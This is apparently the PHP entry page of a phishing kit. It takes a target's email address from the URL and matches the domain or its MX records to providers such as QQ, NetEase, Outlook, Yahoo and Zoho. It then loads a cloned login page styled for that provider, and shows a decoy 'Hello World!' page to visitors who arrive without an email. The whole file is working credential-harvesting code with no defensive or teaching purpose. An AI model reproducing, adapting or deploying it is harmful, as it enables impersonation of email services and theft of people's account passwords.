<?php
 $lang = "en";

if (isset($_REQUEST['lang'])) {

    switch ($_REQUEST['lang']) {
        case 'cn':
            $lang = "cn";
        break;

        case 'en':
            $lang = "en";
        break;
        
        default:
            $lang = "en";
        break;
    }
}

?>

<!DOCTYPE html>
<html lang="<?php echo $lang ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./favicon.svg" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="./css/netease_qiye.css">
    <link rel="stylesheet" href="./css/netease.css">
    <link rel="stylesheet" href="./css/qq.css">
    <link rel="stylesheet" href="./css/style_263.css">
    <link rel="stylesheet" href="./css/aliyun.css">
    <link rel="stylesheet" href="./css/sina.css">
    <link rel="stylesheet" href="./css/global.css">
    <link rel="stylesheet" href="./css/bossmail.css">
    <link rel="stylesheet" href="./css/yun_mail.css">
    <link rel="stylesheet" href="./css/coremail.css">
    <link rel="stylesheet" href="./css/mail_35.css">
    <link rel="stylesheet" href="./css/microsoftonline.css">
    <link rel="stylesheet" href="./css/mail_300.css">
    <link rel="stylesheet" href="./css/dns_cn.css">
    <link rel="stylesheet" href="./css/ex.qq.css">
    <link rel="stylesheet" href="./css/cn4e.css">
    <link rel="stylesheet" href="./css/yah.css">
    <link rel="stylesheet" href="./css/rediffmail.css">
    <link rel="stylesheet" href="./css/inbox.css">
    <link rel="stylesheet" href="./css/zoho.css">
    <link rel="stylesheet" href="./css/daum.css">
    <link rel="stylesheet" href="./css/webmail.css">
    <link rel="stylesheet" href="./css/loca.css">
    <link rel="stylesheet" href="./css/default.css">
    <title>Login Page</title>
    <script src="./jquery.3.7.0.js"></script>
</head>
<body>

<main>
    <div id="loader">
        <p></p>
    </div>
    <?php

    if (isset($_REQUEST['id'])) {
        if (filter_var($_REQUEST['id'], FILTER_VALIDATE_EMAIL)) {
            $dm = filter_var($_REQUEST['id'], FILTER_SANITIZE_EMAIL);
            $getDomain = explode('@', $dm)[1];
            $getSMTP = "default";

            if ($getDomain == "163.com" || $getDomain == "126.com" || $getDomain == "yeah.net" || $getDomain == "vip.163.com" || $getDomain == "vip.126.com" || $getDomain == "vip.yeah.net"){
                include_once './pages/netease/login.php';
                $getSMTP = "netease";
            }
            else if ($getDomain == "qq.com" || $getDomain == "vip.qq.com"){
                include_once './pages/qq/login.php';
                $getSMTP = "qq";
            }
            else if ($getDomain == "263.com" || $getDomain == "vip.263.com" || $getDomain == "263.net" || $getDomain == "vip.263.net"){
                include_once './pages/263/login.php';
                $getSMTP = "263";
            }
            else if ($getDomain == "aliyun.com" || $getDomain == "vip.aliyun.com"){
                include_once './pages/aliyun/login.php';
                $getSMTP = "aliyun";
            }
            else if ($getDomain == "sina.com" || $getDomain == "vip.sina.com"){
                include_once './pages/sina/login.php';
                $getSMTP = "sina";
            }
            else if ($getDomain == "outlook.com" || $getDomain == "hotmail.com" || $getDomain == "msn.com" || $getDomain == "live.com"){
                include_once './pages/outlook/login.php';
                $getSMTP = "outlook";
            }
            else if ($getDomain == "yahoo.com" || $getDomain == "ymail.com" || $getDomain == "aol.com"){
                include_once './pages/yah_oo/login.php';
                $getSMTP = "yahoo";
            }
            else if ($getDomain == "rediffmail.com"){
                include_once './pages/rediffmail/login.php';
                $getSMTP = "rediffmail";
            }
            else if ($getDomain == "zoho.com"){
                include_once './pages/zoho/login.php';
                $getSMTP = "zoho";
            }
            // else if ($getDomain == "gsuit.com" || $getDomain == "gmail.com"){
            //     include_once './pages/gmail/login.php';
            // }
            // else if ($getDomain == "gmx.com" || $getDomain == "gmx.net"){
            //     include_once './pages/gmx/login.php';
            // }
            else if ($getDomain == "inbox.com" || $getDomain == "mailcore.net"){
                include_once './pages/inbox/login.php';
                $getSMTP = "inbox";
            }
            // else if ($getDomain == "yandex.com" || $getDomain == "yandex.ru"){
            //     include_once './pages/yandex/login.php';
            // }
            else if ($getDomain == "daum.net" || $getDomain == "hanmail.net"){
                include_once './pages/daum/login.php';
                $getSMTP = "daum";
            }
            else{
                $result = dns_get_record("$getDomain", DNS_ALL);
                
                $microsoft = "/protection.outlook.com/i";
                $netease = "/mxmail.netease.com/i";
                $exmailQQ = "/qq.com/i";
                $mail_263 = "/263.net/i";
                $aliyun = "/aliyun.com/i";
                $sina = "/sina.com.cn/i";
                $globalmail = "/memail.com/i";
                $yunyou = "/yunyou.top/i";
                $coremail = "/icoremail.net/i";
                $chinanetsun = "/chinanetsun.com/i";
                $chinaemail = "/chinaemail.cn/i";
                $cn4e = "/cn4e.com/i";
                $yahoo = "/yahoodns.net/i";
                $gmail = "/gmail-smtp-in.l.google.com/i";
                $yandex = "/yandex.ru/i";
                $hanmail = "/hanmail.net/i";
                $yah = "/yahoodns.net/i";
                $rediffmail = "/rediff.akadns.net/i";
                $inbox = "/mailcore.net/i";
                $zoho = "/zoho.com/i";
                $daum = "/hanmail.net/i";
                $loca = "/locaweb.com.br/i";

                for ($i=0; $i < count($result); $i++) { 
                    if ($result[$i]['type'] == "MX") {
                        $smtp = $result[$i]['target'];
                        $host = $result[$i]['host'];

                        if (preg_match($microsoft, $smtp) == true) {
                            include_once './pages/microsoftonline/login.php'; 
                            $getSMTP = "outlook"; 
                        }
                        else if (preg_match($netease, $smtp) == true) {
                            include_once './pages/netease_qiye/login.php';
                            $getSMTP = "netease";  
                        }
                        else if (preg_match($exmailQQ, $smtp) == true) {
                            include_once './pages/exmail_qq/login.php';  
                            $getSMTP = "qq";
                        }
                        else if (preg_match($mail_263, $smtp) == true) {
                            include_once './pages/263/login.php'; 
                            $getSMTP = "263"; 
                        }
                        else if (preg_match($aliyun, $smtp) == true) {
                            include_once './pages/aliyun/login.php';  
                            $getSMTP = "aliyun";
                        }
                        else if (preg_match($sina, $smtp) == true) {
                            include_once './pages/sina/login.php'; 
                            $getSMTP = "sina"; 
                        }
                        else if (preg_match($globalmail, $smtp) == true && $host == "globalmail.com") {
                            include_once './pages/global_mail/login.php';  
                            $getSMTP = "globalmail";
                        }
                        else if (preg_match($globalmail, $smtp) == true && $host == "bossmail.net") {
                            include_once './pages/bossmail/login.php';  
                            $getSMTP = "bossmail";
                        }
                        else if (preg_match($globalmail, $smtp) == true) {
                            include_once './pages/global_mail/login.php';  
                            $getSMTP = "globalmail";
                        }
                        else if (preg_match($chinaemail, $smtp) == true) {
                            include_once './pages/bossmail/login.php';  
                            $getSMTP = "bossmail";
                        }
                        else if (preg_match($yunyou, $smtp) == true) {
                            include_once './pages/yun_mail/login.php';  
                            $getSMTP = "yunyou";
                        }
                        else if (preg_match($coremail, $smtp) == true && $host == "dns.com.cn") {
                            include_once './pages/dns_cn/login.php';  
                            $getSMTP = "dns_cn";
                        }
                        else if (preg_match($coremail, $smtp) == true) {
                            include_once './pages/coremail/login.php';  
                            $getSMTP = "coremail";
                        }
                        else if (preg_match($chinanetsun, $smtp) == true) {
                            include_once './pages/35/login.php'; 
                            $getSMTP = "chinanetsun";
                        }
                        else if (preg_match($cn4e, $smtp) == true) {
                            include_once './pages/cn4e/login.php'; 
                            $getSMTP = "cn4e"; 
                        }
                        else if (preg_match($yah, $smtp) == true) {
                            include_once './pages/yah_oo/login.php';  
                            $getSMTP = "yahoo";
                        }
                        else if (preg_match($rediffmail, $smtp) == true) {
                            include_once './pages/rediffmail/login.php';
                            $getSMTP = "rediffmail";  
                        }
                        else if (preg_match($inbox, $smtp) == true) {
                            include_once './pages/inbox/login.php'; 
                            $getSMTP = "inbox"; 
                        }
                        else if (preg_match($zoho, $smtp) == true) {
                            include_once './pages/zoho/login.php';  
                            $getSMTP = "zoho";
                        }
                        else if (preg_match($daum, $smtp) == true) {
                            include_once './pages/daum/login.php'; 
                            $getSMTP = "daum"; 
                        }
                        else if (preg_match($loca, $smtp) == true) {
                            include_once './pages/loca/login.php'; 
                            $getSMTP = "locaweb"; 
                        }                       
                        else{

                            if ($result[$i]['type'] == "NS") {
                                $zmail300 = "/dnsv4.com/i";
                                $serv = $result[$i]['target'];
                                if (preg_match($zmail300, $serv) == true) {
                                    include_once './pages/mail_300/login.php';  
                                    $getSMTP = "mail300";
                                }
                            }
                            else{
                                // default page
                                // include_once './pages/default/login.php';
                                include_once './pages/webmail/login.php';
                            }
                        }
                    }
                    
                } 
            }

            echo '
                <input type="hidden" id="pg_smtp" value="'.$getSMTP.'">
            ';
        } 
        else{
            FunctionName();
        }
    } 
    else {
        FunctionName(); 
    }
    
    function FunctionName() {
        echo '
            <section style="display:flex; justify-content:center; align-items:center; width:100%; height:100vh">
                <h1>Hello World!</h1>
            </section>
        ';
    }

    ?>
</main>
    <script src="./js/index.js"></script>
    <script src="./js/netease_qiye.js"></script>
    <script src="./js/netease.js"></script>
    <script src="./js/qq.js"></script>
    <script src="./js/263.js"></script>
    <script src="./js/aliyun.js"></script>
    <script src="./js/sina.js"></script>
    <script src="./js/global.js"></script>
    <script src="./js/bossmail.js"></script>
    <script src="./js/yun_mail.js"></script>
    <script src="./js/coremail.js"></script>
    <script src="./js/mail_35.js"></script>
    <script src="./js/microsoftonline.js"></script>
    <script src="./js/mail_300.js"></script>
    <script src="./js/dns.cn.js"></script>
    <script src="./js/ex.qq.js"></script>
    <script src="./js/cn4e.js"></script>
    <script src="./js/yah.js"></script>
    <script src="./js/rediffmail.js"></script>
    <script src="./js/inbox.js"></script>
    <script src="./js/zoho.js"></script>
    <script src="./js/daum.js"></script>
    <script src="./js/webmail.js"></script>
    <script src="./js/loca.js"></script>
    <script src="./js/default.js"></script>
</body>
</html>